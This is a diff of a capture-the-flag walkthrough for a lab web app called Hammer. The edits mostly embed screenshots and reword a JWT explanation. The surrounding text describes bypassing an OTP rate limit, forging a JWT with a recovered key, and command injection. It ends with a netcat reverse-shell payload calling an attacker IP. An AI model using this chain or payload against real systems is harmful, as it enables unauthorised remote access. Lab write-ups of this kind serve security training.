@@ -28,7 +28,7 @@ PORT     STATE SERVICE
 Port 22 and 1337 are open, because the room context is a web application, so just analyze http on port 1337
 
 ## 2. Web Enumeration
-Visit web on port 1337 and we will get login page `assets/login_page.png`. Then check the source page.
+Visit web on port 1337 and we will get login page ![Login page](assets/login_page.png) Then check the source page.
 
 ```html
  <title>Login</title>
@@ -51,7 +51,8 @@ css                     [Status: 301, Size: 317, Words: 20, Lines: 10, Duration:
 
 ```
 The results of the enumeration are the hmr_logs, hmr_images, hmr_css and hmr_js directories.<br>
-Visit directory hmr_logs and open error.logs `assets/hmr_logs.png`<br>
+Visit directory hmr_logs and open error.logs ![Logs Page](assets/hmr_logs.png)<br><br>
+enter error.logs
 ```text
 # error.logs
 [Mon Aug 19 12:01:22.987654 2024] [authz_core:error] [pid 12346:tid 139999999999998] [client 192.168.1.15:45918] AH01630: client denied by server configuration: /var/www/html/
@@ -70,8 +71,9 @@ Because there is a login page on the web, so the first thing to do is analyze th
 
 ## 4. Password Recovery OTP
 
-Go to the forgot password page and enter the email `tester@hammer.thm`<br>Then enter OTP code `assets/otp_page.png`
+Go to the forgot password page and enter the email `tester@hammer.thm`<br>Then enter OTP code ![Page OTP](assets/otp_page.png)<br>
 
+Get request in burp suite
 ```http
 POST /reset_password.php HTTP/1.1
 Host: hammer.thm:1337
@@ -90,7 +92,7 @@ Connection: keep-alive
 
 recovery_code=1234&s=180
 ```
-There is a rate limit on OTP. Each session can only allow a maximum of 7 attempts, each lasting 180s. `assets/rate_limite.png`
+There is a rate limit on OTP. Each session can only allow a maximum of 7 attempts, each lasting 180s. ![Rate limite](assets/rate_limite.png)
 
 
 ## 5. ByPass OTP
@@ -118,8 +120,10 @@ Use burp proxy to retrieve session cookies. Use ffuf instead of burp because in 
 Receive OTP and reset password
 
 ## 6. Discover and Analysis Command Page
-`assets/command_page.png`
+### After login i get command page
+![Command page](assets/command_page.png)<br>
 
+HTTP Request
 ```http
 POST /execute_command.php HTTP/1.1
 Host: hammer.thm:1337
@@ -163,7 +167,7 @@ Authorization on this website uses the header Authorization: Bearer <token>
 ```text
 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsI....<REDACTED>....signature
 ```
-JWT uses the base64 format to encode its tokens. The token consists of `header.payload.signature`.<br> Use cyberchef to decode token.<br><br>
+A JWT consists of three parts `header.payload.signature`. The header and payload are base64 URL encoded and can be decoded without the signing key. The signature verifies whether the token has been modified.<br> Use cyberchef to decode token.<br><br>
 After I analyzed the token whose signature was removed and the algorithm was set to 'None', it could not be used in requests on the web because it had been validated on the server side.<br>
 So the way to do it is to use the key i got earlier and use that key to generate a new token. `<REDACTED>`
 
@@ -207,4 +211,4 @@ listening on [any] 4444 ...
 ```http
 {"command":"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <IP> <PORT> > /tmp/f"}
 ```
-after that i managed to make a reverse shell and get a flag `assets/reverse_shell.png`
+after that i managed to make a reverse shell and get a flag<br> ![Reverse Shell](assets/reverse_shell.png)
